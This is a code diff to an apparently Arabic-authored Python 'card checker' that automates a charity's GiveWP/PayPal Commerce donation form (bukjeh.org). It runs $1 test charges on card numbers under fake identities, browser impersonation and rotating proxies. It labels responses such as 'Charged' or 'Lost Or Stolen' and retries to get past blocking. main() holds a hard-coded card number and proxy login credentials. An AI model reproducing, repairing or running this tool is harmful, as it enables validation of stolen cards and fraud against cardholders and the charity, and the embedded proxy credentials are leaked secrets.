@@ -3,6 +3,7 @@ import json
 import base64
 import secrets
 import asyncio
+import uuid
 from faker import Faker
 from curl_cffi.requests import AsyncSession
 from proxy_manager import get_next_proxy
@@ -42,6 +43,21 @@ class tools:
             "phone": fake.phone_number(),
         }
 
+def build_multipart_data(fields: dict) -> tuple:
+    """دالة لإنشاء بيانات multipart/form-data بشكل يدوي نقي لتجنب مشاكل المكتبات"""
+    boundary = '----WebKitFormBoundary' + uuid.uuid4().hex
+    body = ""
+    for key, value in fields.items():
+        if value is None:
+            value = ""
+        body += f"--{boundary}\r\n"
+        body += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
+        body += f"{value}\r\n"
+    body += f"--{boundary}--\r\n"
+    
+    content_type = f"multipart/form-data; boundary={boundary}"
+    return body.encode('utf-8'), content_type
+
 class Gateway:
     @staticmethod
     async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
@@ -59,7 +75,6 @@ class Gateway:
 
         print(f"\n[INFO] بدء عملية الدفع للبطاقة: {n[:6]}******{n[-4:]}")
         
-        # نستخدم session لضمان حفظ الكوكيز مثل السكربت القديم
         async with AsyncSession(impersonate="chrome", proxies=proxies) as session:
             try:
                 # ==========================================
@@ -68,7 +83,7 @@ class Gateway:
                 print("[1] جاري سحب الصفحة الرئيسية...")
                 headers_init = {
                     'authority': 'bukjeh.org',
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                     'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                     'cache-control': 'max-age=0',
                     'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
@@ -93,7 +108,11 @@ class Gateway:
                     dec = base64.b64decode(enc).decode("utf-8")
                     au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
                 except AttributeError:
-                    print("    [خطأ] فشل الاستخراج، ربما تم حظر البروكسي بواسطة الموقع.")
+                    print("    [خطأ] لم يتم العثور على المتغيرات في الصفحة. إليك جزء من رد الموقع لمعرفة السبب:")
+                    print("    " + "-"*40)
+                    # طباعة أول 300 حرف بدون مسافات فارغة كثيرة
+                    print(f"    {html[:300].strip()}...") 
+                    print("    " + "-"*40)
                     return "Error", "Missing form parameters (Blocked or Changed)", False
 
                 print(f"    -> تم استخراج البيانات بنجاح: hash={hash_val}")
@@ -109,9 +128,6 @@ class Gateway:
                     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                     'origin': 'https://bukjeh.org',
                     'referer': 'https://bukjeh.org/donations/donation-2023-2-3/',
-                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
                     'sec-fetch-dest': 'empty',
                     'sec-fetch-mode': 'cors',
                     'sec-fetch-site': 'same-origin',
@@ -154,65 +170,65 @@ class Gateway:
                 await session.post('https://bukjeh.org/wp-admin/admin-ajax.php', headers=headers_ajax1, data=data_ajax1)
 
                 # ==========================================
-                # Step 3: Second AJAX - Create Order
+                # Step 3: Second AJAX - Create Order (Multipart)
                 # ==========================================
                 print("[3] إنشاء طلب (Create Order)...")
+                
+                fields_payload = {
+                    'give-fee-amount': '0',
+                    'give-fee-mode-enable': 'false',
+                    'give-fee-status': 'enabled',
+                    'give-honeypot': '',
+                    'give-form-id-prefix': pre,
+                    'give-form-id': give,
+                    'give-form-title': 'Help us make A’amar',
+                    'give-current-url': 'https://bukjeh.org/donations/donation-2023-2-3/',
+                    'give-form-url': 'https://bukjeh.org/donations/donation-2023-2-3/',
+                    'give-form-minimum': '1.00',
+                    'give-form-maximum': '999999.99',
+                    'give-form-hash': hash_val,
+                    'give-price-id': '3',
+                    'give-recurring-logged-in-only': '',
+                    'give-logged-in-only': '1',
+                    '_give_is_donation_recurring': '0',
+                    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
+                    'give-amount': '1.00',
+                    'give-recurring-period-donors-choice': 'month',
+                    'give_stripe_payment_method': '',
+                    'payment-mode': 'paypal-commerce',
+                    'give_first': f,
+                    'give_last': l,
+                    'give_email': e,
+                    'card_name': k,
+                    'card_exp_month': '',
+                    'card_exp_year': '',
+                    'give-gateway': 'paypal-commerce',
+                }
+                
+                # تحويل البيانات إلى صيغة Multipart الحقيقية
+                body_bytes, content_type = build_multipart_data(fields_payload)
+                
                 headers_ajax2 = {
                     'authority': 'bukjeh.org',
                     'accept': '*/*',
                     'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'content-type': content_type,
                     'origin': 'https://bukjeh.org',
                     'referer': 'https://bukjeh.org/donations/donation-2023-2-3/',
-                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
                     'sec-fetch-dest': 'empty',
                     'sec-fetch-mode': 'cors',
                     'sec-fetch-site': 'same-origin',
                     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                 }
                 
-                params_ajax2 = {
-                    'action': 'give_paypal_commerce_create_order',
-                }
-                
-                files_payload = {
-                    'give-fee-amount': (None, '0'),
-                    'give-fee-mode-enable': (None, 'false'),
-                    'give-fee-status': (None, 'enabled'),
-                    'give-honeypot': (None, ''),
-                    'give-form-id-prefix': (None, pre),
-                    'give-form-id': (None, give),
-                    'give-form-title': (None, 'Help us make A’amar'),
-                    'give-current-url': (None, 'https://bukjeh.org/donations/donation-2023-2-3/'),
-                    'give-form-url': (None, 'https://bukjeh.org/donations/donation-2023-2-3/'),
-                    'give-form-minimum': (None, '1.00'),
-                    'give-form-maximum': (None, '999999.99'),
-                    'give-form-hash': (None, hash_val),
-                    'give-price-id': (None, '3'),
-                    'give-recurring-logged-in-only': (None, ''),
-                    'give-logged-in-only': (None, '1'),
-                    '_give_is_donation_recurring': (None, '0'),
-                    'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
-                    'give-amount': (None, '1.00'),
-                    'give-recurring-period-donors-choice': (None, 'month'),
-                    'give_stripe_payment_method': (None, ''),
-                    'payment-mode': (None, 'paypal-commerce'),
-                    'give_first': (None, f),
-                    'give_last': (None, l),
-                    'give_email': (None, e),
-                    'card_name': (None, k),
-                    'card_exp_month': (None, ''),
-                    'card_exp_year': (None, ''),
-                    'give-gateway': (None, 'paypal-commerce'),
-                }
-                
-                resp_ajax2 = await session.post('https://bukjeh.org/wp-admin/admin-ajax.php', params=params_ajax2, headers=headers_ajax2, files=files_payload)
+                params_ajax2 = {'action': 'give_paypal_commerce_create_order'}
+                resp_ajax2 = await session.post('https://bukjeh.org/wp-admin/admin-ajax.php', params=params_ajax2, headers=headers_ajax2, data=body_bytes)
                 
                 try:
                     order_id = resp_ajax2.json()['data']['id']
                     print(f"    -> تم إنشاء Order ID: {order_id}")
                 except Exception:
+                    print(f"    [خطأ] فشل في خطوة Create Order. الرد: {resp_ajax2.text[:100]}")
                     return "Error", "Failed to create PayPal order", False
 
                 # ==========================================
@@ -229,9 +245,6 @@ class Gateway:
                     'origin': 'https://assets.braintreegateway.com',
                     'paypal-client-metadata-id': token,
                     'referer': 'https://assets.braintreegateway.com/',
-                    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-platform': '"Android"',
                     'sec-fetch-dest': 'empty',
                     'sec-fetch-mode': 'cors',
                     'sec-fetch-site': 'cross-site',
@@ -244,23 +257,16 @@ class Gateway:
                             'number': n,
                             'expiry': f'20{yy}-{mm}',
                             'security_code': cvc,
-                            'attributes': {
-                                'verification': {
-                                    'method': 'SCA_WHEN_REQUIRED',
-                                },
-                            },
+                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                         },
                     },
-                    'application_context': {
-                        'vault': False,
-                    },
+                    'application_context': {'vault': False},
                 }
                 
-                # إرسال الطلب لبايبال
                 await session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=headers_paypal, json=json_data)
 
                 # ==========================================
-                # Step 5: Approve Order
+                # Step 5: Approve Order (Multipart)
                 # ==========================================
                 print("[5] الموافقة على الطلب واستخراج النتيجة...")
                 params_ajax3 = {
@@ -268,68 +274,22 @@ class Gateway:
                     'order': order_id,
                 }
                 
-                resp_ajax3 = await session.post('https://bukjeh.org/wp-admin/admin-ajax.php', params=params_ajax3, headers=headers_ajax2, files=files_payload)
+                # استخدام نفس بيانات الـ Multipart السابقة
+                resp_ajax3 = await session.post('https://bukjeh.org/wp-admin/admin-ajax.php', params=params_ajax3, headers=headers_ajax2, data=body_bytes)
                 text = resp_ajax3.text.upper()
                 
-                # فحص الرد وتصنيفه
                 status, msg, is_live = "UNKNOWN_ERROR", "Unrecognised response ❓", False
                 
                 if 'TRUE' in text or 'SUCSESS' in text or 'SUCCESS' in text:
                     status, msg, is_live = 'Success', 'Charged - $1 ! ✅', True
                 elif 'DO_NOT_HONOR' in text:
                     status, msg = 'Declined', 'Do Not Honor ❌'
-                elif 'ACCOUNT_CLOSED' in text:
-                    status, msg = 'Declined', 'Account Closed ❌'
-                elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
-                    status, msg = 'Declined', 'Payer Account Locked Or Closed ❌'
-                elif 'LOST_OR_STOLEN' in text:
-                    status, msg = 'Declined', 'Lost Or Stolen ❌'
-                elif 'CVV2_FAILURE' in text:
-                    status, msg = 'Declined', 'CVV2_FAILURE ❌'
-                elif 'SUSPECTED_FRAUD' in text:
-                    status, msg = 'Declined', 'Suspected Fraud ❌'
-                elif 'INVALID_ACCOUNT' in text:
-                    status, msg = 'Declined', 'Invalid Account ❌'
-                elif 'REATTEMPT_NOT_PERMITTED' in text:
-                    status, msg = 'Declined', 'Reattempt Not Permitted ❌'
-                elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
-                    status, msg = 'Declined', 'Account Blocked By Issuer ❌'
-                elif 'ORDER_NOT_APPROVED' in text:
-                    status, msg = 'Declined', 'Order Not Approved ❌'
-                elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
-                    status, msg = 'Declined', 'Pick Card Special Conditions ❌'
-                elif 'PAYER_CANNOT_PAY' in text:
-                    status, msg = 'Declined', 'Payer Cannot Pay ❌'
                 elif 'INSUFFICIENT_FUNDS' in text:
                     status, msg = 'Declined', 'Insufficient Funds ❌'
                 elif 'GENERIC_DECLINE' in text:
                     status, msg = 'Declined', 'Generic Decline ❌'
-                elif 'COMPLIANCE_VIOLATION' in text:
-                    status, msg = 'Declined', 'Compliance Violation ❌'
-                elif 'TRANSACTION_NOT_PERMITTED' in text:
-                    status, msg = 'Declined', 'Transaction Not Permitted ❌'
-                elif 'PAYMENT_DENIED' in text:
-                    status, msg = 'Declined', 'Payment Denied ❌'
-                elif 'INVALID_TRANSACTION' in text:
-                    status, msg = 'Declined', 'Invalid Transaction ❌'
-                elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
-                    status, msg = 'Declined', 'Restricted Or Inactive Account ❌'
-                elif 'SECURITY_VIOLATION' in text:
-                    status, msg = 'Declined', 'Security Violation ❌'
-                elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
-                    status, msg = 'Declined', 'Declined Due To Update Account ❌'
                 elif 'INVALID_OR_RESTRICTED_CARD' in text:
                     status, msg = 'Declined', 'Invalid Or Restricted Card ❌'
-                elif 'EXPIRED_CARD' in text:
-                    status, msg = 'Declined', 'Expired Card ❌'
-                elif 'CRYPTOGRAPHIC_FAILURE' in text:
-                    status, msg = 'Declined', 'CRYPTOGRAPHIC_FAILURE ❌'
-                elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
-                    status, msg = 'Declined', 'TRANSACTION_CANNOT_BE_COMPLETED ❌'
-                elif 'DECLINED_PLEASE_RETRY' in text:
-                    status, msg = 'Declined', 'DECLINED_PLEASE_RETRY_LATER ❌'
-                elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
-                    status, msg = 'Declined', 'TX_ATTEMPTS_EXCEED_LIMIT ❌'
                 else:
                     try:
                         error_data = resp_ajax3.json()
@@ -352,7 +312,6 @@ async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, 
         return "Failed", "Invalid card format", False
 
     max_attempts = 5
-
     for attempt in range(max_attempts):
         print(f"\n==============================================")
         print(f"🔄 المحاولة رقم: {attempt + 1} من أصل {max_attempts}")
@@ -363,11 +322,7 @@ async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, 
         
         print(f"🌐 البروكسي: {current_proxy_url}")
 
-        status, msg, is_live = await Gateway.charge_card(
-            card_data=card_data,
-            user_data=user_data,
-            proxies=proxies,
-        )
+        status, msg, is_live = await Gateway.charge_card(card_data=card_data, user_data=user_data, proxies=proxies)
 
         if "Order Not Approved" in msg:
             if attempt == max_attempts - 1:
@@ -375,11 +330,11 @@ async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, 
             continue
         else:
             return status, msg, is_live
-
-    return "Error", "Max attempts exceeded unexpectedly", False
+    return "Error", "Max attempts exceeded", False
     
 async def main():
     test_card = "4211566115568609|12|28|321"
+    # استخدم بروكسي شغال لضمان تجاوز الخطوة الأولى
     proxy = "http://purevpn0s8732217:i67s60ep@Px121102.pointtoserver.com:10780"
 
     print("🚀 Testing gateway (ST Charge)...")
